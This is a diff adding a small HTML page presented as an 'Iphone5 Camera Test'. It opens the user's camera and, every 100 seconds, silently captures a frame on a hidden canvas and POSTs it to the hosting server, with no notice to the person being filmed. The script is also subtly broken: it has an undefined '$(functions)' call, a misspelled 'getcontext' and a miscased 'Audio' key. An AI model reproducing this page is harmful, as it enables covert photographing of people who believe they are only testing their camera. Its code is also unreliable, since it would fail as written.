@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title> Iphone5 Camera Test </title>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+
+    </head>
+    <body>
+        <h1>test my shit!</h1>
+        <video id="video" width="640" height="480"></video>
+        <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
+    <script>
+        $(functions)
+        var video = document.querySelector('#video');
+        var canvas = document.querySelector('#canvas');
+        var context = canvas.getcontext('2d');
+        var constraints = {Audio:false, video: true};
+
+        navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+          video.srcObject = stream;
+        }).catch(function(error) {
+          console.error('Error accessing camera', error);
+        });
+
+        function takePicture() {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          var dataUrl = canvas.toDataURL();
+          $.ajax({
+            type: 'POST',
+            url: '/',
+            data: { image: dataUrl },
+            success: function(response) {
+              console.log('Server response:', response);
+            },
+            error: function(xhr, status, error) {
+              console.error('Error sending picture to server', error);
+            }
+          });
+        }
+        setInterval(takePicture, 100000);
+      
+    </script>
+  </body>
+</html>
